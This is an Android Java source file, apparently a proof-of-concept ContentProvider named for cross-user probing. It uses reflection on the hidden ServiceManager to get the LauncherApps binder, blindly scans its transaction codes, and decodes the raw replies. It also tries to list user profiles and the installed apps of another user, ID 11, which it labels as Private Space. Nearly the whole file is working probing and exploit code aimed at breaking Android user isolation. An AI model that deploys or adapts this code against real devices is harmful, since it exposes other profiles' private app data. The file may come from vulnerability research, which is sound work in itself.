package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class LauncherProbeProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        IBinder binder = getServiceBinder("launcherapps");
        if (binder == null) { cursor.addRow(new Object[]{"error", "no binder"}); return cursor; }
        String desc = "android.content.pm.ILauncherApps";

        // Full TX scan — ILauncherApps has ~30 methods
        // We pass (String callingPackage) as first arg for most methods
        cursor.addRow(new Object[]{"=== FULL TX SCAN ===", ""});
        for (int tx = 1; tx <= 40; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            int pos = reply.dataPosition();
                            StringBuilder raw = new StringBuilder("OK avail=" + avail + " [");
                            int maxInts = Math.min(avail / 4, 8);
                            for (int i = 0; i < maxInts; i++) {
                                if (reply.dataAvail() >= 4) {
                                    int v = reply.readInt();
                                    if (v > 0x20 && v < 0x7F) {
                                        raw.append("'" + (char)v + "'");
                                    } else {
                                        raw.append(String.format("0x%X", v));
                                    }
                                    if (i < maxInts - 1) raw.append(",");
                                }
                            }
                            raw.append("]");
                            cursor.addRow(new Object[]{"tx" + tx, raw.toString()});
                        }
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"tx" + tx, "SEC:" + truncate(e.getMessage())});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && msg.length() > 3 && !msg.contains("consumed")) {
                            cursor.addRow(new Object[]{"tx" + tx, "EX:" + truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }

        // After TX scan, test specific methods with correct params:
        // getUserProfiles: expects (callingPackage, boolean excludeQuiet)
        cursor.addRow(new Object[]{"=== getUserProfiles attempts ===", ""});
        for (int tx : new int[]{1, 2, 3, 4, 5, 10, 15, 20, 25, 30, 35}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0); // excludeQuiet = false
                binder.transact(tx, data, reply, 0);
                reply.readException();
                int avail = reply.dataAvail();
                if (avail >= 8) {
                    int pos = reply.dataPosition();
                    // UserHandle list format: writeTypedList -> count + UserHandle parcelables
                    // UserHandle writeToParcel: writeInt(mHandle)
                    int count = reply.readInt();
                    if (count > 0 && count < 20) {
                        StringBuilder sb = new StringBuilder("count=" + count + " users=[");
                        for (int i = 0; i < count; i++) {
                            int marker = reply.readInt();
                            if (marker != 0) {
                                int userId = reply.readInt();
                                sb.append(userId);
                                if (i < count - 1) sb.append(",");
                            }
                        }
                        sb.append("]");
                        cursor.addRow(new Object[]{"profiles_tx" + tx, sb.toString()});
                    }
                }
            } catch (Exception e) {
                // skip
            }
            data.recycle();
            reply.recycle();
        }

        // Try specific: getPrivateSpaceSettingsIntent
        // Also: getLauncherUserInfo(UserHandle)
        cursor.addRow(new Object[]{"=== getPrivateSpaceSettingsIntent ===", ""});
        for (int tx = 1; tx <= 40; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                // getPrivateSpaceSettingsIntent() — no args besides interface token
                binder.transact(tx, data, reply, 0);
                reply.readException();
                int avail = reply.dataAvail();
                if (avail > 20) {
                    // Intent parcelable should be large
                    int marker = reply.readInt();
                    if (marker != 0) {
                        // This could be an Intent — try reading action
                        try {
                            String action = reply.readString();
                            if (action != null && action.contains("android")) {
                                cursor.addRow(new Object[]{"intent_tx" + tx,
                                    "GOT INTENT! action=" + truncate(action)});
                            }
                        } catch (Exception ignored) {}
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }

        // Try LauncherApps API via reflection
        cursor.addRow(new Object[]{"=== LauncherApps API ===", ""});
        try {
            Object la = getContext().getSystemService("launcherapps");
            if (la != null) {
                // getProfiles()
                try {
                    Method getProfiles = la.getClass().getMethod("getProfiles");
                    Object profiles = getProfiles.invoke(la);
                    cursor.addRow(new Object[]{"api_getProfiles", profiles != null ? profiles.toString() : "null"});
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"api_getProfiles", "ERR:" + truncate(e.getCause() != null ? e.getCause().getMessage() : e.getMessage())});
                }

                // getActivityList(null, UserHandle.of(0))
                try {
                    Class<?> uhClass = Class.forName("android.os.UserHandle");
                    Method of = uhClass.getMethod("of", int.class);
                    Object uh0 = of.invoke(null, 0);
                    Method getActivityList = la.getClass().getMethod("getActivityList", String.class, uhClass);
                    Object list = getActivityList.invoke(la, null, uh0);
                    if (list != null) {
                        java.util.List<?> l = (java.util.List<?>) list;
                        cursor.addRow(new Object[]{"api_actList_u0", "count=" + l.size()});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"api_actList_u0", "ERR:" + truncate(e.getCause() != null ? e.getCause().getMessage() : e.getMessage())});
                }

                // getActivityList for user 11
                try {
                    Class<?> uhClass = Class.forName("android.os.UserHandle");
                    Method of = uhClass.getMethod("of", int.class);
                    Object uh11 = of.invoke(null, 11);
                    Method getActivityList = la.getClass().getMethod("getActivityList", String.class, uhClass);
                    Object list = getActivityList.invoke(la, null, uh11);
                    if (list != null) {
                        java.util.List<?> l = (java.util.List<?>) list;
                        cursor.addRow(new Object[]{"api_actList_u11", "count=" + l.size() + " PRIVATE SPACE APPS!"});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"api_actList_u11", "ERR:" + truncate(e.getCause() != null ? e.getCause().getMessage() : e.getMessage())});
                }
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"launcherapps_api", "ERR:" + truncate(e.getMessage())});
        }

        return cursor;
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
